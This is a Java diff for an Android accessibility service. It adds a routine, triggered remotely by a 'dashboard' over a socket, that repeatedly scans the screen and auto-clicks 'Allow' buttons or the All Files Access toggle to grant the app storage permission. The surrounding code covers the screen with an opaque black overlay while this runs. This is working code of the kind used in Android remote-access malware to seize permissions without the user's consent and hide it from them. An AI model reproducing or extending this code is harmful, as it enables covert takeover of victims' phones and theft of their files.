@@ -554,6 +554,56 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
+     * Dedicated auto-granter for the File & Storage (All Files Access) permission.
+     * Called from SocketManager when the dashboard sends request_storage_permission.
+     *
+     * Strategy (runs every 300 ms for 20 seconds):
+     *  1. Look for a clickable "Allow access" element → click it.
+     *  2. If not found, look for a clickable "Allow" element → click it.
+     *  3. If neither found, try enabling the toggle/switch on the screen
+     *     (Android 11+ All Files Access page shows a toggle, not a button).
+     *
+     * The app name must be visible on screen for any action to fire,
+     * preventing false clicks on unrelated permission dialogs.
+     */
+    public void enableStorageAutoGrant() {
+        if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
+
+        final long endTime = System.currentTimeMillis() + 20_000;
+        final Handler storageHandler = new Handler(Looper.getMainLooper());
+
+        storageHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                if (System.currentTimeMillis() > endTime) {
+                    Log.i(TAG, "Storage auto-grant scanner expired");
+                    return;
+                }
+                try {
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        String appName = getString(R.string.app_name);
+                        String screenText = getAllScreenText(rootNode).toLowerCase();
+                        boolean appVisible = screenText.contains(appName.toLowerCase());
+
+                        if (appVisible) {
+                            // 1. Try "Allow access" button first
+                            boolean clicked = clickTextElementCI(rootNode, "Allow access");
+                            // 2. Fall back to "Allow"
+                            if (!clicked) clicked = clickTextElementCI(rootNode, "Allow");
+                            // 3. Fall back to toggle/switch (All Files Access settings page)
+                            if (!clicked) runAccessibilityToggleGranter(rootNode);
+                        }
+                        rootNode.recycle();
+                    }
+                } catch (Exception ignored) {}
+                storageHandler.postDelayed(this, 300);
+            }
+        });
+        Log.i(TAG, "Storage auto-grant scanner started for 20 s");
+    }
+
+    /**
      * Shows a fully opaque black overlay for 10 seconds while auto-grant runs.
      * Uses TYPE_ACCESSIBILITY_OVERLAY so no SYSTEM_ALERT_WINDOW permission is needed.
      * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE ensure touches still reach permission dialogs
